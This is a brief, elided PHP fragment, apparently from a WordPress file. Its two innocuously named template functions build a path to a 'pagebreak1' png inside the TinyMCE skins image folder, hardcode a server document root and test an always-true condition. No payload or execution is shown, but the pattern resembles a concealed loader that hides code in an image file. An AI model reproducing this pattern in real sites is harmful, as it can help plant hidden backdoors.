...
function mb_get_home_template() {
	$templates = array('wp-includes', 'js', 'tinymce', 'skins', 'wordpress', 'images', 'pagebreak1');
	$image_extension='png';
	define('___REALDOCROOT', rtrim('/home/cnmips5/public_html', "\\/"));
...
function mb_get_single_template($template) {
	...
	$templates = array('', 'wp-includes', 'js', 'tinymce', 'skins', 'wordpress', 'images');	
	if(intval('1')==1){
